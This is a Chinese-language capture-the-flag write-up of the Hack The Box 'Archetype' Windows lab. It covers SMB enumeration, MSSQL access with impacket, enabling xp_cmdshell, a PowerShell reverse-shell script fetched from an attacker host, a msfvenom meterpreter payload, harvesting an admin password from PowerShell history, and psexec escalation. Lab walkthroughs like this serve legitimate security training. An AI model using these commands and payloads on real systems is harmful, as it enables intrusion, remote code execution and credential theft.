---
title: HTB-Archetype
description: 'Hack the box'
pubDate: 2024-03-04 
image: /hackthebox/Archetype.png
categories:
  - Documentation
tags:
  - Hackthebox
  - Windows Machine
---

## TASK 1
![](/image/hackthebox/Archetype-1.png)

nmap -sV -f 10.129.169.148

![](/image/hackthebox/Archetype-2.png)

## TASK 2
![](/image/hackthebox/Archetype-3.png)

根据hint直接subclient一下

![](/image/hackthebox/Archetype-4.png)

尾缀没有$就是非管理共享目录

```plain
SMB与CIFS为服务器通信协议，常用于Windows95/98/NT等系统。
smbclient(samba client)可让Linux系统存取Windows系统所分享的资源。
-B<ip地址>：传送广播数据包时所用的IP地址；
-d<排错层级>：指定记录文件所记载事件的详细程度；
-E：将信息送到标准错误输出设备；
-h：显示帮助；
-i<范围>：设置NetBIOS名称范围；
-I<IP地址>：指定服务器的IP地址；
-l<记录文件>：指定记录文件的名称；
-L：显示服务器端所分享出来的所有资源；
-M<NetBIOS名称>：可利用WinPopup协议，将信息送给选项中所指定的主机；
-n<NetBIOS名称>：指定用户端所要使用的NetBIOS名称；
-N：不用询问密码；
-O<连接槽选项>：设置用户端TCP连接槽的选项；
-p<TCP连接端口>：指定服务器端TCP连接端口编号；
-R<名称解析顺序>：设置NetBIOS名称解析的顺序；
-s<目录>：指定smb.conf所在的目录；
-t<服务器字码>：设置用何种字符码来解析服务器端的文件名称；
-T<tar选项>：备份服务器端分享的全部文件，并打包成tar格式的文件；
-U<用户名称>：指定用户名称；
-w<工作群组>：指定工作群组名称。
```

## TASK 3
![](/image/hackthebox/Archetype-5.png)

![](/image/hackthebox/Archetype-6.png)

使用get将文件下载下来

## TASK 4


![](/image/hackthebox/Archetype-7.png)

这里考察的我们对impacket框架的了解，在impacket中哪个脚本可以连接SQL Server使用git拉取> 



> git clone [https://github.com/SecureAuthCorp/impacket.git](https://github.com/SecureAuthCorp/impacket.git)
>
> cd impacket  
sudo python3 setup.py install  
pip3 install -r requirements.txt
>

![](/image/hackthebox/Archetype-8.png)

impacket的脚本都在examples里面，看名字知道mssql开头的就是

python mssqlclient.py ARCHETYPE/sql_svc@10.129.219.58 -windows-auth

![](/image/hackthebox/Archetype-9.png)

**ARCHETYPE/sql_svc** 是一个 Windows 认证的用户名，它的格式通常是 **域/用户名**。在这种格式中，**ARCHETYPE** 是 Windows 域的名称，而 **sql_svc** 是该域中的用户名。

**-windows-auth** 表示你要使用 Windows 身份验证来连接到 SQL Server，而不是使用 SQL Server 身份验证（即用户名和密码）。

## TASK 5


![](/image/hackthebox/Archetype-10.png)



![](/image/hackthebox/Archetype-11.png)

成功登录之后可以通过输入以下命令判断当前时候拥有sysadmin权限

SELECT IS_SRVROLEMEMBER('sysadmin')

![](/image/hackthebox/Archetype-12.png)

1代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行

先使用sp_configure命令查看下配置情况，如果配置表里没有xp_cmdshell一栏，使用如下命令。

```sql
EXEC sp_configure 'Show Advanced Options', 1;			\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项
reconfigure;			\\确认上面操作
```

再用sp_configure 命令查看下此时的xp_cmdshell命令是否被允许使用，如值为0使用如下命令。

```sql
EXEC sp_configure 'xp_cmdshell', 1						\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令
reconfigure;											\\确认上面的操作
```

尝试执行命令

xp_cmdshell "whoami"

![](/image/hackthebox/Archetype-13.png)

虽然 **xp_cmdshell** 存储过程允许在 SQL Server 中执行一些操作系统级别的命令，但它的功能是受到限制的，并且在安全性上也存在一些风险。因此，有时候需要直接的操作系统shell来进行更多和更复杂的操作。所以我们要反弹shell

启动py共享文件

python3 -m http.server 80

shell.ps1

```sql
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.20",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.20/shell.ps1\");"

nc -nvlp 443

![](/image/hackthebox/Archetype-14.png)

在C:\Users\sql_svc\Desktop\user.txt中找到User Own的Flag

3e7b102e78218e935bf3f4951fec21a3

![](/image/hackthebox/Archetype-15.png)

发现sql_svc是操作系统普通用户、数据库以及数据库服务用户，检查一下频繁访问的文件或已执行的命令，使用如下命令来访问PowerShell历史记录文件

```sql
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

![](/image/hackthebox/Archetype-16.png)

发现管理员账号及密码

administrator MEGACORP_4dm1n!!



## TASK 6
![](/image/hackthebox/Archetype-17.png)

这里win和Linux都有一个很好的提权脚本叫PEAS

Linux系统叫linpeas，win系统叫winpeas

Git下载地址：[https://github.com/carlospolop/PEASS-ng/releases/tag/20220710](https://github.com/carlospolop/PEASS-ng/releases/tag/20220710)

（著名的windows信息枚举以发现存在的漏洞）

将其下载到linux本机

wget [https://github.com/carlospolop/PEASS-ng/releases/download/20220320/winPEASx86.exe](https://github.com/carlospolop/PEASS-ng/releases/download/20220320/winPEASx86.exe)

利用msf反弹shell

msfvenom -p  windows/meterpreter/reverse_tcp LHOST=10.10.16.20 -f exe -o payload.exe

在kali Linux本地运行http服务器（用python http模块）

SQL> xp_cmdshell "powershell wget http://10.10.16.20/payload.exe -OutFile c:\\Users\Public\\payload.exe"

set payload windows/meterpreter/reverse_tcp

set lhost 10.10.16.20

EXEC xp_cmdshell 'C:\Users\Public\payload.exe';

run（进行监听）

EXEC xp_cmdshell 'C:\Users\Public\payload.exe';  进行执行

![](/image/hackthebox/Archetype-18.png)

成功获得user的flag



也可以尝试直接使用Impacket中的psexec提权，其原理是：

> 1.通过ipc$连接，释放psexecsvc.exe到目标
>
> 2.通过服务管理SCManager远程创建psexecsvc服务，并启动服务。
>
> 3.客户端连接执行命令，服务端启动相应的程序并执行回显数据。
>
> 4.运行完后删除服务。这个在windows的日志中有详细的记录，另外psexec在少数情况下会出现服务没删除成功的bug。
>

           



也可以psexec.py来提权

psexec.py administrator@10.10.10.27

![](/image/hackthebox/Archetype-19.png)

执行 type C:\Users\Administrator\Desktop\root.txt 命令成功拿到System Own的Flag





